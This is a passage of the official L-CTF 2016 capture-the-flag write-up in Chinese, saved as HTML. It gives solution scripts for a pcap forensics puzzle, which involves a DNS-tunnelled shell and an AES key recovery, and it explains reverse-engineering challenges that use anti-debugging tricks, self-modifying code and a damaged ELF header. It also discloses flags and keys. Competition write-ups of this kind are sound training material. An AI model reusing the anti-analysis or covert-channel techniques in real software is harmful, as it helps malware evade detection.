target="_blank"><img src="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/t01ddca200a18ca29f6.png" title="t01fd1c03220a5a6ced.png" alt="http://p1.qhimg.com/t01fd1c03220a5a6ced.png" style="visibility: visible;"></a></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">图片解密python脚本：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  python"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div><div class="line number14 index13 alt1">14</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="python plain">with&nbsp;</code><code class="python functions">open</code><code class="python plain">(</code><code class="python string">"whoami.jpg"</code><code class="python plain">,</code><code class="python string">'r'</code><code class="python plain">)&nbsp;as&nbsp;</code><code class="python functions">file</code><code class="python plain">:</code></div><div class="line number2 index1 alt1"><code class="python spaces">&nbsp;&nbsp;</code><code class="python plain">pic</code><code class="python keyword">=</code><code class="python functions">file</code><code class="python plain">.read()</code></div><div class="line number3 index2 alt2"><code class="python plain">temp</code><code class="python keyword">=</code><code class="python plain">''</code></div><div class="line number4 index3 alt1"><code class="python plain">with&nbsp;</code><code class="python functions">open</code><code class="python plain">(</code><code class="python string">'xor.jpg'</code><code class="python plain">,</code><code class="python string">'r'</code><code class="python plain">)&nbsp;as&nbsp;</code><code class="python functions">file</code><code class="python plain">:</code></div><div class="line number5 index4 alt2"><code class="python spaces">&nbsp;&nbsp;</code><code class="python plain">t</code><code class="python keyword">=</code><code class="python functions">file</code><code class="python plain">.read()</code></div><div class="line number6 index5 alt1"><code class="python spaces">&nbsp;&nbsp;</code><code class="python keyword">for</code>&nbsp;<code class="python plain">a,b&nbsp;</code><code class="python keyword">in</code>&nbsp;<code class="python functions">zip</code><code class="python plain">(t,pic):</code></div><div class="line number7 index6 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python functions">print</code>&nbsp;<code class="python functions">chr</code><code class="python plain">(</code><code class="python functions">ord</code><code class="python plain">(a)^</code><code class="python functions">ord</code><code class="python plain">(b)),</code></div><div class="line number8 index7 alt1"><code class="python plain">m</code><code class="python keyword">=</code><code class="python string">"cc90b9054ca67557813694276ab54c67aa93092ec87dd7b539"</code></div><div class="line number9 index8 alt2"><code class="python keyword">def</code>&nbsp;<code class="python plain">process(a,b,m):</code></div><div class="line number10 index9 alt1"><code class="python spaces">&nbsp;&nbsp;</code><code class="python keyword">return</code>&nbsp;<code class="python plain">"".join(</code><code class="python functions">map</code><code class="python plain">(</code><code class="python functions">chr</code><code class="python plain">,</code><code class="python functions">map</code><code class="python plain">(</code><code class="python keyword">lambda</code>&nbsp;<code class="python plain">x:&nbsp;(x</code><code class="python keyword">*</code><code class="python plain">a</code><code class="python keyword">+</code><code class="python plain">b)</code><code class="python keyword">%</code><code class="python value">251</code><code class="python plain">,</code><code class="python functions">map</code><code class="python plain">(</code><code class="python functions">ord</code><code class="python plain">,m.decode(</code><code class="python string">'hex'</code><code class="python plain">)))))</code></div><div class="line number11 index10 alt2"><code class="python keyword">for</code>&nbsp;<code class="python plain">i&nbsp;</code><code class="python keyword">in</code>&nbsp;<code class="python functions">xrange</code><code class="python plain">(</code><code class="python value">255</code><code class="python plain">):</code></div><div class="line number12 index11 alt1"><code class="python spaces">&nbsp;&nbsp;</code><code class="python keyword">for</code>&nbsp;<code class="python plain">j&nbsp;</code><code class="python keyword">in</code>&nbsp;<code class="python functions">xrange</code><code class="python plain">(</code><code class="python value">255</code><code class="python plain">):</code></div><div class="line number13 index12 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">if</code>&nbsp;<code class="python string">"AES"</code>&nbsp;<code class="python keyword">in</code>&nbsp;<code class="python plain">process(i,j,m):</code></div><div class="line number14 index13 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python functions">print</code>&nbsp;<code class="python plain">process(i,j,m)</code></div></div></td></tr></tbody></table><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">得到AES_key{}，AES啊！不是LCTF！</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">然后DNS流量异常，找了个DNSshell不能用啊，于是自己xjb写了一个xjb传的shell。发一个baidu.com的开始接收命令，一个命令执行传回去一个google.com。找到这些返回google.com的蜜汁流量，拼到一起用AES_key解密就可以看到：</span></p><p style="text-indent: 2em; text-align: center;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><a href="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/t019b771f46c68cf1da.png" target="_blank"><img src="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/t019b771f46c68cf1da.png" title="t0170af8e053e87fa99.png" alt="http://p1.qhimg.com/t0170af8e053e87fa99.png" style="visibility: visible;"></a></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">混进去了一堆xjb访问的http流量，访问了L-team.org的about页面，发现DNS解析了不少dalao博客的地址，就当广告了233333：</span></p><p style="text-indent: 2em; text-align: center;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><a href="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/t0180f56480f7da8b5a.png" target="_blank"><img src="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/t0180f56480f7da8b5a.png" title="t0114a40c67d78e85d4.png" alt="http://p7.qhimg.com/t0114a40c67d78e85d4.png" style="visibility: visible;"></a></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">最后，解密得到<span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(255, 0, 0);">Please submit the used ftp CVE ID like "CVE********"and LCTF{A11_1n_0ne_Pcap} as your flag.eg."CVE12345678A11_1n_0ne_Pcap"</span></span></p><p style="text-indent: 2em; text-align: left;"><br></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br></span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">Reverse</span></strong></span></p><hr><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">Re100</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">re100设计之初就是消耗耐心的逆向，并没有什么有趣的东西在里面，所以最后的排序函数也只是烂代码增加难度系列(不要打我)。此外Re100最后的排序算法出了一点小问题，需要选手用暴力搜索来解出这道题，不过对题目整体设计没有影响。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">算法主体是CBC+字符串排序。外围是Qt的信号槽机制。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">排序函数：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">&nbsp; &nbsp; </span></p><table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  cpp"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div><div class="line number14 index13 alt1">14</div><div class="line number15 index14 alt2">15</div><div class="line number16 index15 alt1">16</div><div class="line number17 index16 alt2">17</div><div class="line number18 index17 alt1">18</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="cpp keyword bold">for</code><code class="cpp plain">(QVector&lt;</code><code class="cpp color1 bold">int</code><code class="cpp plain">&gt;::iterator&nbsp;iter&nbsp;=&nbsp;pd.begin();&nbsp;iter&nbsp;!=&nbsp;pd.end();&nbsp;++iter){</code></div><div class="line number2 index1 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">num&nbsp;=&nbsp;*iter;</code></div><div class="line number3 index2 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">num&nbsp;=&nbsp;num&nbsp;%&nbsp;key.size();</code></div><div class="line number4 index3 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp keyword bold">while</code><code class="cpp plain">(randlist.indexOf(num)&nbsp;!=&nbsp;-1){</code></div><div class="line number5 index4 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">num&nbsp;=&nbsp;(num&nbsp;+&nbsp;1)&nbsp;%&nbsp;pd.size();</code></div><div class="line number6 index5 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">}</code></div><div class="line number7 index6 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">randlist.append(num);</code></div><div class="line number8 index7 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">}</code></div><div class="line number9 index8 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp keyword bold">void</code>&nbsp;<code class="cpp plain">Randlist::randpd(QVector&lt;</code><code class="cpp color1 bold">int</code><code class="cpp plain">&gt;&nbsp;&amp;pd){</code></div><div class="line number10 index9 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp color1 bold">int</code>&nbsp;<code class="cpp plain">idlist;</code></div><div class="line number11 index10 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp color1 bold">int</code>&nbsp;<code class="cpp plain">begin_index&nbsp;=&nbsp;0;</code></div><div class="line number12 index11 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp color1 bold">int</code>&nbsp;<code class="cpp plain">idpd&nbsp;=&nbsp;begin_index;</code></div><div class="line number13 index12 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp keyword bold">do</code><code class="cpp plain">{</code></div><div class="line number14 index13 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">idlist&nbsp;=&nbsp;randlist.indexOf(idpd);</code></div><div class="line number15 index14 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">std::swap(pd[idlist],&nbsp;pd[begin_index]);</code></div><div class="line number16 index15 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">idpd&nbsp;=&nbsp;idlist;</code></div><div class="line number17 index16 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">}</code><code class="cpp keyword bold">while</code><code class="cpp plain">(idpd&nbsp;!=&nbsp;begin_index);</code></div><div class="line number18 index17 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">}</code></div></div></td></tr></tbody></table><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span><br></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">程序流程是，获取输入后先用<span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 0, 0);">\x09</span>补全长度到5的倍数。之后是CBC加密，这里没有使用初始IV。<span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 0, 0);">key="Cirno"</span>，5个字符一组，先和将每一个字符的高4位和低4位交换，再和key异或。除第一组外每组再和前一组异或。最后使用上面的代码和最初(补全后)的输入生成奇怪的位置字典，重排CBC后的字串，进行`strcmp`。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">Re200</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 0, 0);">re200是一个完(zhi)整(zhang)的文件加密器。当然，解密器我没有写。这题本来是想玩SMC的...但是后来发现写好的SMC对逆向无任何干扰，反而是signal坑了不少人。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 0, 0);">程序在main函数执行前(init)先运行了sub_8048901，用sig == ppid检测了是否被调试，如果是的话就直接将一个后面用到的表填充为错误数值。之后是取得分页大小，将sub_8048AC3所在的内存设置为RWX。最后设置<span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 0, 0);"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">signal(SIGUSR1, sub_80489FB)</span>。以上这些除了sysconf()，都是<span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">int 0x80</span>实现的。</span></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 0, 0);">main函数执行，再一次检测是否有调试(有的话直接exit)，获得用户输入，补全为偶数长度，拷贝字符串到全局变量，然后用kill(0, SIGUSR1)触发了之前设置的signal，跳转到sub_80489FB。将补全后的字符串分为两个一组，循环调用sub_8048A7B。在sub_8048A7B中根据((a&gt;&gt;2)&amp;0x3)和之前的表得到一个函数地址，调用sub_8048AC3。</span></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 0, 0);"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">sub_8048AC3</span><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">在初始化时被设置为<span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">RWX</span>...利用<span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">sub_8048A7B</span>中的函数地址进行SMC，跳转到取得的函数中。在之后的函数就是对这组字符的移位和异或加密。</span></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 0, 0);">signal处理完成，回到正常流程中，再再一次检测是否有调试(出题人:求不打)。对加密完的字串做base16。最后用维吉尼亚算法加密文件，输出。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 0, 0);">解题时，维吉尼亚直接在线解密就可以，然后得到key.明文是小说《基督山伯爵》里面随意选的一段话，只是为了帮助进行维吉尼亚解密，并没有实际意义。解密得到key后，程序就和一个crackme没什么区别了...分析算法逆出orignal key即可。测试时是正向暴力破解，反推也没问题。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">orignal key = H4ck1ngT0TheGate</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">此外：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">main函数的前后分别会执行init和finit。本题源码中的init声明如下</span></p><table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  cpp"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="cpp keyword bold">void</code>&nbsp;<code class="cpp plain">init_game(</code><code class="cpp keyword bold">void</code><code class="cpp plain">)&nbsp;__attribute__((constructor));</code></div></div></td></tr></tbody></table><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">objdump和gdb分析ELF时都需要Section header table，但是ELF文件的执行只需要Program header table。程序编译完之后直接覆盖了Section header table，导致gdb直接GG。但是对IDA无效。section header table也是可以重建的，但是...之后还是有反调试拦着(逃)。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">因为char类型的符号问题，在逆推时会有点小问题。但是这并不重要...逆推也是可解的。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">测试脚本：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">&nbsp; &nbsp; </span></p><table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  cpp"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div><div class="line number14 index13 alt1">14</div><div class="line number15 index14 alt2">15</div><div class="line number16 index15 alt1">16</div><div class="line number17 index16 alt2">17</div><div class="line number18 index17 alt1">18</div><div class="line number19 index18 alt2">19</div><div class="line number20 index19 alt1">20</div><div class="line number21 index20 alt2">21</div><div class="line number22 index21 alt1">22</div><div class="line number23 index22 alt2">23</div><div class="line number24 index23 alt1">24</div><div class="line number25 index24 alt2">25</div><div class="line number26 index25 alt1">26</div><div class="line number27 index26 alt2">27</div><div class="line number28 index27 alt1">28</div><div class="line number29 index28 alt2">29</div><div class="line number30 index29 alt1">30</div><div class="line number31 index30 alt2">31</div><div class="line number32 index31 alt1">32</div><div class="line number33 index32 alt2">33</div><div class="line number34 index33 alt1">34</div><div class="line number35 index34 alt2">35</div><div class="line number36 index35 alt1">36</div><div class="line number37 index36 alt2">37</div><div class="line number38 index37 alt1">38</div><div class="line number39 index38 alt2">39</div><div class="line number40 index39 alt1">40</div><div class="line number41 index40 alt2">41</div><div class="line number42 index41 alt1">42</div><div class="line number43 index42 alt2">43</div><div class="line number44 index43 alt1">44</div><div class="line number45 index44 alt2">45</div><div class="line number46 index45 alt1">46</div><div class="line number47 index46 alt2">47</div><div class="line number48 index47 alt1">48</div><div class="line number49 index48 alt2">49</div><div class="line number50 index49 alt1">50</div><div class="line number51 index50 alt2">51</div><div class="line number52 index51 alt1">52</div><div class="line number53 index52 alt2">53</div><div class="line number54 index53 alt1">54</div><div class="line number55 index54 alt2">55</div><div class="line number56 index55 alt1">56</div><div class="line number57 index56 alt2">57</div><div class="line number58 index57 alt1">58</div><div class="line number59 index58 alt2">59</div><div class="line number60 index59 alt1">60</div><div class="line number61 index60 alt2">61</div><div class="line number62 index61 alt1">62</div><div class="line number63 index62 alt2">63</div><div class="line number64 index63 alt1">64</div><div class="line number65 index64 alt2">65</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="cpp color1 bold">char</code>&nbsp;<code class="cpp plain">*strkey&nbsp;=&nbsp;</code><code class="cpp string">"ieedcpgdhkedddfenkfaifgggcgbbbgf"</code><code class="cpp plain">;</code></div><div class="line number2 index1 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp color1 bold">char</code>&nbsp;<code class="cpp plain">all_a;</code></div><div class="line number3 index2 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp color1 bold">char</code>&nbsp;<code class="cpp plain">all_b;</code></div><div class="line number4 index3 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp color1 bold">int</code>&nbsp;<code class="cpp plain">main(</code><code class="cpp color1 bold">int</code>&nbsp;<code class="cpp plain">argc,&nbsp;</code><code class="cpp color1 bold">char</code>&nbsp;<code class="cpp keyword bold">const</code>&nbsp;<code class="cpp plain">*argv[])</code></div><div class="line number5 index4 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">{</code></div><div class="line number6 index5 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">boom();</code></div><div class="line number7 index6 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp keyword bold">return</code>&nbsp;<code class="cpp plain">0;</code></div><div class="line number8 index7 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">}</code></div><div class="line number9 index8 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp keyword bold">void</code>&nbsp;<code class="cpp plain">zero(){</code></div><div class="line number10 index9 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp color1 bold">char</code>&nbsp;<code class="cpp plain">c;</code></div><div class="line number11 index10 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp comments">//c&nbsp;=&nbsp;a</code></div><div class="line number12 index11 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">c&nbsp;=&nbsp;(all_a&nbsp;&amp;&nbsp;0xF0)&nbsp;|&nbsp;(all_b&nbsp;&amp;&nbsp;0x0F);</code></div><div class="line number13 index12 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">all_b&nbsp;=&nbsp;(all_a&nbsp;&amp;&nbsp;0x0F)&nbsp;|&nbsp;(all_b&nbsp;&amp;&nbsp;0xF0);</code></div><div class="line number14 index13 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">all_a&nbsp;=&nbsp;c;</code></div><div class="line number15 index14 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">all_a&nbsp;=&nbsp;all_a&nbsp;^&nbsp;0x99;</code></div><div class="line number16 index15 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">all_b&nbsp;=&nbsp;all_b&nbsp;^&nbsp;0x55;</code></div><div class="line number17 index16 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">}</code></div><div class="line number18 index17 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp keyword bold">void</code>&nbsp;<code class="cpp plain">one(){</code></div><div class="line number19 index18 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">all_a&nbsp;=&nbsp;all_a&nbsp;^&nbsp;all_b;</code></div><div class="line number20 index19 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">all_b&nbsp;=&nbsp;((all_b&nbsp;&gt;&gt;&nbsp;4)&nbsp;&amp;&nbsp;0x0F)&nbsp;|&nbsp;((all_b&nbsp;&lt;&lt;&nbsp;4)&nbsp;&amp;&nbsp;0xF0);</code></div><div class="line number21 index20 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">}</code></div><div class="line number22 index21 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp keyword bold">void</code>&nbsp;<code class="cpp plain">two(){</code></div><div class="line number23 index22 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp comments">//c&nbsp;=&nbsp;a</code></div><div class="line number24 index23 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp color1 bold">char</code>&nbsp;<code class="cpp plain">c;</code></div><div class="line number25 index24 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">c&nbsp;=&nbsp;(all_a&nbsp;&amp;&nbsp;0x0F)&nbsp;|&nbsp;(((all_b&nbsp;&amp;&nbsp;0x0F)&nbsp;&lt;&lt;&nbsp;4)&nbsp;&amp;&nbsp;0xF0);</code></div><div class="line number26 index25 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">all_b&nbsp;=&nbsp;((all_a&nbsp;&gt;&gt;&nbsp;4)&nbsp;&amp;&nbsp;0x0F)&nbsp;|&nbsp;(all_b&nbsp;&amp;&nbsp;0xF0);</code></div><div class="line number27 index26 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">all_a&nbsp;=&nbsp;c;</code></div><div class="line number28 index27 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">}</code></div><div class="line number29 index28 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp keyword bold">void</code>&nbsp;<code class="cpp plain">three(){</code></div><div class="line number30 index29 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp comments">//and&nbsp;0xF0&nbsp;?</code></div><div class="line number31 index30 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">all_a&nbsp;=&nbsp;all_a&nbsp;^&nbsp;(all_a&nbsp;&lt;&lt;&nbsp;4);</code></div><div class="line number32 index31 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">all_b&nbsp;=&nbsp;all_b&nbsp;^&nbsp;(all_b&nbsp;&lt;&lt;&nbsp;4);</code></div><div class="line number33 index32 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">}</code></div><div class="line number34 index33 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp keyword bold">void</code>&nbsp;<code class="cpp plain">boom(){</code></div><div class="line number35 index34 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp color1 bold">char</code>&nbsp;<code class="cpp plain">end[16];</code></div><div 